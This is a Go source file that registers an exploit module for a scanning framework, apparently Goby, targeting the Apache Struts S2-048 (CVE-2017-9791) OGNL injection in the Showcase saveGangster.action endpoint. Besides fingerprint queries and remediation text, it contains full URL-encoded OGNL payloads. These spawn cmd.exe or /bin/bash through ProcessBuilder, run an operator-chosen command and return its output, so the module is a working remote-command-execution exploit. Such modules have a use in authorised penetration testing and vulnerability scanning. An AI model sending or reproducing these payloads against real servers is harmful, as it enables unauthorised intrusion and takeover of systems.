package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Struts S2-048 2.3.x saveGangster.action RCE",
    "Description": "<p>Apache Struts2 is an open source web application framework for developing Java EE web applications.</p><p>In the ActionMessage class of Struts 2.3. x Showcase plug-in, remote command attacks can be realized by building untrusted input. The cause of the vulnerability is that when ActionMessage receives parameter data controlled by the customer, arbitrary code execution is caused due to improper processing after subsequent data splicing and transmission.</p>",
    "Product": "Struts2",
    "Homepage": "http://struts.apache.org/",
    "DisclosureDate": "2017-07-08",
    "Author": "872554564@qq.com",
    "FofaQuery": "(body=\"Struts Problem Report\" || body=\"There is no Action mapped for namespace\" || body=\"No result defined for action and result input\" || title==\"Struts2 Showcase\" || (body=\"<input type=\\\"hidden\\\" name=\\\"struts.token.name\\\"\" && body=\"action\"))",
    "GobyQuery": "(body=\"Struts Problem Report\" || body=\"There is no Action mapped for namespace\" || body=\"No result defined for action and result input\" || title==\"Struts2 Showcase\" || (body=\"<input type=\\\"hidden\\\" name=\\\"struts.token.name\\\"\" && body=\"action\"))",
    "Level": "3",
    "Impact": "<p>An attacker can execute arbitrary commands on the server, write back doors, invade the server, gain the administrator privileges of the server, and cause the server to be controlled.</p>",
    "Recommendation": "<p>Official solution:</p><p>The official version update has been released. It is recommended that users upgrade to Struts 2.5.10.1. The download link is as follows:</p><p><a href=\"https://github.com/apache/struts/releases/tag/STRUTS_2_5_10_1\">https://github.com/apache/struts/releases/tag/STRUTS_2_5_10_1</a></p><p><a href=\"http://struts.apache.org/download.cgi\">http://struts.apache.org/download.cgi</a></p><p>Temporary repair plan: (It may affect the business. Please make a backup before modification.)</p><p>1. Developers use the resource call method to replace the original value transfer method to ActionMessage. As follows:</p><p>messages.add(“msg”, new ActionMessage(“struts1.gangsterAdded”, gform.getName()));</p><p>Do not use the following methods:</p><p>messages.add(“msg”, new ActionMessage(“Gangster ” + gform.getName() + ” was added”));</p><p>2. Disable the struts2-struts1-plugin plug-in if it is not necessary. Move the struts2-struts1-plugin-2.3. x.jar file from the \"/WEB INF/lib\" directory to another folder or delete it.</p><p>Official solution:</p><p>The official version update has been released. It is recommended that users upgrade to Struts 2.5.10.1. The download link is as follows:</p><p><a href=\"https://github.com/apache/struts/releases/tag/STRUTS_2_5_10_1\">https://github.com/apache/struts/releases/tag/STRUTS_2_5_10_1</a></p><p><a href=\"http://struts.apache.org/download.cgi\">http://struts.apache.org/download.cgi</a></p><p>Temporary repair plan: (It may affect the business. Please make a backup before modification.)</p><p>1. Developers use the resource call method to replace the original value transfer method to ActionMessage. As follows:</p><p>messages.add(“msg”, new ActionMessage(“struts1.gangsterAdded”, gform.getName()));</p><p>Do not use the following methods:</p><p>messages.add(“msg”, new ActionMessage(“Gangster ” + gform.getName() + ” was added”));</p><p>2. Disable the struts2-struts1-plugin plug-in if it is not necessary. Move the struts2-struts1-plugin-2.3. x.jar file from the \"/WEB INF/lib\" directory to another folder or delete it.</p>",
    "References": [
        "https://cwiki.apache.org/confluence/display/WW/S2-048"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/integration/saveGangster.action",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo%20bvfcgngasssdfv%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=123&__cheackbox_bustedBefore=true&description=123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "bvfcgngasssdfv",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/struts2-showcase/integration/saveGangster.action",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo%20bvfcgngasssdfv%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=123&__cheackbox_bustedBefore=true&description=123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "bvfcgngasssdfv",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/integration/saveGangster.action",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27{{{cmd}}}%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=123&__cheackbox_bustedBefore=true&description=123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/struts2-showcase/integration/saveGangster.action",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27{{{cmd}}}%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=123&__cheackbox_bustedBefore=true&description=123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "CKE",
        "2H1W"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2017-9791"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Struts S2-048 2.3.x saveGangster.action 远程命令执行",
            "Product": "Struts2",
            "Description": "<p>Apache Struts2是一个用于开发Java EE Web应用程序的开源 Web应用程序框架。</p><p>在Struts 2.3.x&nbsp; Showcase 插件的ActionMessage 类中，通过构建不可信的输入可实现远程命令攻击。漏洞成因是当ActionMessage接收客户可控的参数数据时，由于后续数据拼接且传递后处理不当导致任意代码执行。<br></p>",
            "Recommendation": "<p>官方解决方案：</p><p>官方已经发布了版本更新，建议用户升级到Struts 2.5.10.1版本，下载链接如下所示：</p><p><a href=\"https://github.com/apache/struts/releases/tag/STRUTS_2_5_10_1\">https://github.com/apache/struts/releases/tag/STRUTS_2_5_10_1</a></p><p><a href=\"http://struts.apache.org/download.cgi\">http://struts.apache.org/download.cgi</a></p><p>临时修复方案：（可能影响业务，修改之前请做好备份。）</p><p>1、开发者通过使用资源调用方式替代原始值传递方式给ActionMessage的方式。 如下所示：</p><p><code>messages.add(“msg”,&nbsp;new&nbsp;ActionMessage(“struts1.gangsterAdded”,&nbsp;gform.getName()));</code></p><p>不要使用如下的方式：</p><p><code>messages.add(“msg”,&nbsp;new&nbsp;ActionMessage(“Gangster&nbsp;”&nbsp;+&nbsp;gform.getName()&nbsp;+&nbsp;”&nbsp;was&nbsp;added”));</code></p><p>2、在非必要的情况下禁用struts2-struts1-plugin插件。将struts2-struts1-plugin-2.3.x.jar文件从 “/WEB-INF/lib”目录中移动到其他文件夹或者删除。</p>",
            "Impact": "<p>攻击者可在服务器上执行任意命令，写入后门，入侵服务器，获取服务器的管理员权限，导致服务器被控制。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "网络关键漏洞",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Struts S2-048 2.3.x saveGangster.action RCE",
            "Product": "Struts2",
            "Description": "<p>Apache Struts2 is an open source web application framework for developing Java EE web applications.</p><p>In the ActionMessage class of Struts 2.3. x Showcase plug-in, remote command attacks can be realized by building untrusted input. The cause of the vulnerability is that when ActionMessage receives parameter data controlled by the customer, arbitrary code execution is caused due to improper processing after subsequent data splicing and transmission.</p>",
            "Recommendation": "<p>Official solution:</p><p>The official version update has been released. It is recommended that users upgrade to Struts 2.5.10.1. The download link is as follows:</p><p><a href=\"https://github.com/apache/struts/releases/tag/STRUTS_2_5_10_1\">https://github.com/apache/struts/releases/tag/STRUTS_2_5_10_1</a></p><p><a href=\"http://struts.apache.org/download.cgi\">http://struts.apache.org/download.cgi</a></p><p>Temporary repair plan: (It may affect the business. Please make a backup before modification.)</p><p>1. Developers use the resource call method to replace the original value transfer method to ActionMessage.&nbsp;As follows:</p><p>messages.add(“msg”, new ActionMessage(“struts1.gangsterAdded”, gform.getName()));</p><p>Do not use the following methods:</p><p>messages.add(“msg”, new ActionMessage(“Gangster ” + gform.getName() + ” was added”));</p><p>2. Disable the struts2-struts1-plugin plug-in if it is not necessary.&nbsp;Move the struts2-struts1-plugin-2.3. x.jar file from the \"/WEB INF/lib\" directory to another folder or delete it.</p><p>Official solution:</p><p>The official version update has been released. It is recommended that users upgrade to Struts 2.5.10.1. The download link is as follows:</p><p><a href=\"https://github.com/apache/struts/releases/tag/STRUTS_2_5_10_1\">https://github.com/apache/struts/releases/tag/STRUTS_2_5_10_1</a></p><p><a href=\"http://struts.apache.org/download.cgi\">http://struts.apache.org/download.cgi</a></p><p>Temporary repair plan: (It may affect the business. Please make a backup before modification.)</p><p>1. Developers use the resource call method to replace the original value transfer method to ActionMessage. As follows:</p><p>messages.add(“msg”, new ActionMessage(“struts1.gangsterAdded”, gform.getName()));</p><p>Do not use the following methods:</p><p>messages.add(“msg”, new ActionMessage(“Gangster ” + gform.getName() + ” was added”));</p><p>2. Disable the struts2-struts1-plugin plug-in if it is not necessary. Move the struts2-struts1-plugin-2.3. x.jar file from the \"/WEB INF/lib\" directory to another folder or delete it.</p>",
            "Impact": "<p>An attacker can execute arbitrary commands on the server, write back doors, invade the server, gain the administrator privileges of the server, and cause the server to be controlled.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "CKE",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9960"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}